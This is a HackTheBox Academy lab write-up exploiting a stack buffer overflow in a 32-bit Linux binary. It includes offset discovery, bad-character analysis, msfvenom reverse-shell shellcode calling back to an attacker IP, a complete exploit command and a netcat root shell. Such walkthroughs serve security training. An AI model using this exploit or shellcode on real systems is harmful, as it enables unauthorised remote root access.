# Buffer Overflow Linux x86 - HackTheBox Academy

jmpman | November 19th 2023

```bash
ssh htb-student@10.129.42.191 -P HTB_@cademy_stdnt!
```

---------------------------------------------------------

## Questions

1) Determine the file type of "leave_msg" binary and submit it as the answer.

```bash
file leave_msg
```

**Answer:** ELF 32-bit

2) How many bytes in total must be sent before reaching EIP?

Let's use the command where we will send the letter A to our program

```bash
(gdb) run $(python -c "print 'A' * 1200")
```

We don't break the program when we do this, but if we increase the multiplication value, we will have a segmentation fault

```bash
(gdb) run $(python -c "print 'A' * 2200")
Starting program: /home/htb-student/leave_msg $(python -c "print '\x41' * 2200")

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
eax            0x0	0
ecx            0x15	21
edx            0x56558158	1448444248
ebx            0x41414141	1094795585
esp            0xffffcce0	0xffffcce0
ebp            0x41414141	0x41414141
esi            0xffffcd20	-13024
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x10282	[ SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99 
```

When we caused the segmentation fault, we overwrote the EIP register with As. To obtain control of the EIP, we will use Metasploit's _pattern_create.rb_ and _pattern_offset.rb_ to find the offset where we can can start modifying the EIP address with what we want

In our machine, we will run the following:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
```

Now, we will have our pattern made of 2200 characters. We will be sending it instead of the many As we sent on the debugger

```bash
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0A...pattern...9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C'")
Starting program: /home/htb-student/leave_msg $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0A...pattern...9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C'")

Program received signal SIGSEGV, Segmentation fault.
0x37714336 in ?? ()
(gdb) i r eip
eip            0x37714336	0x37714336
```

Checking our EIP, we can see that we have successfully controlled it. Our last step is to find the offset with _pattern_offset.rb_, using it like this:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37714336
```

We recieve this as our output:

```bash
[*] Exact match at offset 2060
```

**Answer:** 2060

3) Submit the size of the stack space after overwriting the EIP as the answer. (Format: 0x00000)

To identify the stack space after overwriting the EIP, we can use the following command to view its value on GDB

```bash
(gdb) info proc all
```

Running it, we will have the following output:

```bash
process 2181
warning: target file /proc/2181/cmdline contained unexpected null characters
cmdline = '/home/htb-student/leave_msg'
cwd = '/home/htb-student'
exe = '/home/htb-student/leave_msg'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/htb-student/leave_msg
	0x56556000 0x56557000     0x1000        0x0 /home/htb-student/leave_msg
	0x56557000 0x56558000     0x1000     0x1000 /home/htb-student/leave_msg
	0x56558000 0x56579000    0x21000        0x0 [heap]
	0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fc3000 0xf7fc6000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdc000 0xffffe000    0x22000        0x0 [stack]	# <--- Stack Space Value
```

**Answer:** 0x22000

4) Read the file "/root/flag.txt" and submit the content as the answer.

Now, we must apply our reverse shell payload to obtain access to the root user. To do so, we will be using Metasploit to create our payload and calculate it's size before creating our clean reverse shell payload

```bash
msfvenom -p linux/x86/shell_reverse_tcp -ax86 LHOST=10.10.16.33 LPORT=8888 -f c
```

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
...
```

Generating our payload, we see that the size is 68 bytes. Knowing this, we can build what we will be sending to the program

As a precaution, we should try to take a larger range if the shellcode increases due to later specifications. Often it can be useful to insert some **no operation instruction (NOPS)** before our shellcode begins so that it can be executed cleanly. 

Let us briefly summarize what we need for this:

- We need a total of 2064 bytes to get to the EIP
- Here, we can use an additional 100 bytes of NOPS
- 150 bytes for our shellcode.

```
   Buffer = "\x55" * (2064 - 100 - 150 - 4) = 1810
   NOPS = "\x90" * 100
   Shellcode = "\x44" * 150
   EIP = "\x66" * 4
```

Now we have to identify bad characters for running the program correctly. To generate our bad chars payload, we will be using a simple Python script that is going to help us do it

```python
#!/usr/share/env python3

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')

print()
```

As a result of our Python script, we have our pattern of bad characters created, excluding the null byte which is by default a bad character

```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

With our bad characters pattern, we are going to send it to the debugger an identify the bad characters, comparing our payload with the default pattern we created. In the process, we will set a breakpoint in the leavemsg function so we can easily analyze the memory content

```bash
(gdb) break leavemsg
Breakpoint 1 at 0x691
```

We need to aply a few changes in our payload. We must change the buffer size to adapt with the bad characters pattern we have generated

Now, we can send our payload with the following format:

```
Buffer = 'A' * (2064 - 255 - 4) => 1805
Bad Chars = pattern
EIP = 'B' * 4
```

```bash
(gdb) run $(python -c "print 'A' * 1805 + 'B' * 4 + '\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'")
```

```bash
Starting program: /home/htb-student/leave_msg $(python -c "print 'A' * 1805 + 'B' * 4 + '\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'")

Breakpoint 1, 0x56555691 in leavemsg ()
```

To analyze the stack, we will use the following command to view it

```bash
(gdb) x/2000xb $esp+500
```

Bad Characters: 
```
\x00\x09\x0a\x20\
```

Now that we have found the characters, we can create our Reverse Shell payload to insert into our exploit

```bash
msfvenom -p linux/x86/shell_reverse_tcp -ax86 LHOST=10.10.16.33 LPORT=8888 --bad-chars "\x00\x09\x0a\x20" -f c -o shellcode
```

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes # <-- Size of our Payload
Final size of c file: 425 bytes
Saved as: shellcode
```

Like how we have seen before in the example, we can adjust our exploit scheme and therefore use it to build our exploit:

```
Buffer = "A" * (2064 - 124 - 95 - 4) = 1841
   NOPS = "\x90" * 124
   Shellcode = "\xda\xc5\xba\x97\x35\xe9\x15\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x31\x50\x17\x03\x50\x17\x83\x7f\xc9\x0b\xe0\x4e\xe9\x3b\xe8\xe3\x4e\x97\x85\x01\xd8\xf6\xea\x63\x17\x78\x99\x32\x17\x46\x53\x44\x1e\xc0\x92\x2c\xab\x38\x75\xaa\xc3\x3e\x75\x90\xab\xb6\x94\x64\xad\x98\x07\xd7\x81\x1a\x21\x36\x28\x9c\x63\xd0\xdd\xb2\xf0\x48\x4a\xe2\xd9\xea\xe3\x75\xc6\xb8\xa0\x0c\xe8\x8c\x4c\xc2\x6b"
   EIP = "\x66" * 4
```

We are almost complete. We now need to identify the return address so we can overwrite the EIP to call our Shellcode and therefore have our shell as root. To do so, we will be following the steps below:

```bash
(gdb) run $(python -c "print 'A' * 1841 + '\x90' * 124 + '\xda\xc5\xba\x97\x35\xe9\x15\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x31\x50\x17\x03\x50\x17\x83\x7f\xc9\x0b\xe0\x4e\xe9\x3b\xe8\xe3\x4e\x97\x85\x01\xd8\xf6\xea\x63\x17\x78\x99\x32\x17\x46\x53\x44\x1e\xc0\x92\x2c\xab\x38\x75\xaa\xc3\x3e\x75\x90\xab\xb6\x94\x64\xad\x98\x07\xd7\x81\x1a\x21\x36\x28\x9c\x63\xd0\xdd\xb2\xf0\x48\x4a\xe2\xd9\xea\xe3\x75\xc6\xb8\xa0\x0c\xe8\x8c\x4c\xc2\x6b' + 'B' * 4")
```

```bash
(gdb) x/2000xb $esp+550

<...>
0xffffd6ea:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6f2:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6fa:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd702:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd70a:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd712:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd71a:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd722:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd72a:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd732:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd73a:	0x90	0x90	0x90	0xd9	0xca	0xbe	0xdd	0xe8
<...>
```

```
0xffffd73a
```
\x3a\xd7\xff\xff

We can select one of the following addresses that point to the NOP value. I will chose the _0xffffd72a_. Now, we must write the address in little endian format, which is going to be our NOP address that we chose backwards.

```
\x2a\xd7\xff\xff
```

Now, we have to replace the EIP value in our exploit with the address above, resulting in our final exploit

```bash
./leave_msg $(python -c "print 'A' * 1841 + '\x90' * 124 + '\xda\xc5\xba\x97\x35\xe9\x15\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x12\x31\x50\x17\x03\x50\x17\x83\x7f\xc9\x0b\xe0\x4e\xe9\x3b\xe8\xe3\x4e\x97\x85\x01\xd8\xf6\xea\x63\x17\x78\x99\x32\x17\x46\x53\x44\x1e\xc0\x92\x2c\xab\x38\x75\xaa\xc3\x3e\x75\x90\xab\xb6\x94\x64\xad\x98\x07\xd7\x81\x1a\x21\x36\x28\x9c\x63\xd0\xdd\xb2\xf0\x48\x4a\xe2\xd9\xea\xe3\x75\xc6\xb8\xa0\x0c\xe8\x8c\x4c\xc2\x6b' + '\x3a\xd7\xff\xff'")
```

In our local machine, we will set our listener to recieve the reverse shell as root

```bash
nc -lvnp 8888
listening on [any] 8888 ...

```

We now have a connection and we will have our root flag 

```bash
connect to [10.10.16.33] from (UNKNOWN) [10.129.178.227] 50850
bash -i
root@nixbof32skills:/home/htb-student# id
uid=0(root) gid=1001(htb-student) groups=1001(htb-student)

```
